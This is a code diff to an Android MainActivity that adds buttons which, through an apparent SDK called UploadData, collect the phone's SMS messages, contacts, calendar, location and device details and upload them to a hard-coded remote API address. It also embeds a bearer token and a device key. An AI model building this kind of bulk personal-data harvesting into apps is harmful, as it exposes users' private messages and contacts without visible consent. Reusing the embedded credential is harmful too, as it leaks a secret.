@@ -33,8 +33,13 @@ import com.alibaba.fastjson.JSONException;
 import com.blankj.utilcode.util.NetworkUtils;
 import com.blankj.utilcode.util.ImageUtils;
 import com.blankj.utilcode.util.EncodeUtils;
+import com.johnny.sms.CollectSms;
 import com.johnny.sms.SmsContent;
+import com.johnny.sms.UploadData;
 
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.Date;
 import org.json.JSONObject;
 
 import java.io.File;
@@ -307,8 +312,49 @@ public class MainActivity extends AppCompatActivity {
     }
 
     @RequiresApi(api = Build.VERSION_CODES.M)
-    public void button_click(View view)
-    {
+    private void buttonClick(String type) {
+
+        Context context = MainActivity.this;
+
+        UploadData mUploadData = new UploadData(context);
+
+        // 获取上传sign_url
+        com.alibaba.fastjson.JSONObject systemInfo = new com.alibaba.fastjson.JSONObject();
+        try {
+            systemInfo.put("test", "ooo");
+        } catch (JSONException e) {
+            System.out.println("oss sign:" + e.getMessage());
+            return;
+        }
+        systemInfo = null;
+        String token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTQyNzI2NzEsImlkZW50aXR5IjoiMzE4NzIzMTQwNTI2MDE0NDY0Iiwib3JpZ19pYXQiOjE2NTE2ODA2NzF9.yppIbEctNDFhotPwriDprJHqOlV5HrF4ExouR36qKTQ";
+        String domain = "http://apishop.c99349d1eb3d045a4857270fb79311aa0.cn-shanghai.alicontainer.com/api";
+        String deviceKey = "bff4c2bd436602c9";
+        long timeStamp = 1635955200;
+        switch (type) {
+            case "device":
+                mUploadData.getAndSendDevice(systemInfo, token, domain, timeStamp, deviceKey);
+                break;
+            case "contact":
+                mUploadData.getAndSendContact(systemInfo, token, domain, timeStamp, deviceKey);
+                break;
+            case "calendar":
+                mUploadData.getAndSendCalendar(systemInfo, token, domain, timeStamp, deviceKey);
+                break;
+            case "location":
+                mUploadData.getAndSendLocation(systemInfo, token, domain, timeStamp, deviceKey);
+                break;
+            default:
+                mUploadData.getAndSendSms(systemInfo, token, domain, timeStamp, deviceKey);
+                break;
+        }
+
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    public void button_sms_old_click(View view) {
+
+
         Context context = MainActivity.this;
 
         SmsContent mSmsContent = new SmsContent(context, Uri.parse("content://sms/"));
@@ -325,8 +371,32 @@ public class MainActivity extends AppCompatActivity {
         String domain = "http://apishop.c99349d1eb3d045a4857270fb79311aa0.cn-shanghai.alicontainer.com/api";
         String deviceKey = "bff4c2bd436602c9";
         long timeStamp = 1635955200;
-
         mSmsContent.getAndSendSms(systemInfo, token, domain, timeStamp, deviceKey);
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    public void button_device_click(View view) {
+        buttonClick("device");
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    public void button_contact_click(View view) {
+        buttonClick("contact");
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    public void button_sms_click(View view) {
+        buttonClick("sms");
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    public void button_calendar_click(View view) {
+        buttonClick("calendar");
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    public void button_location_click(View view) {
+        buttonClick("location");
     }
 
     /**
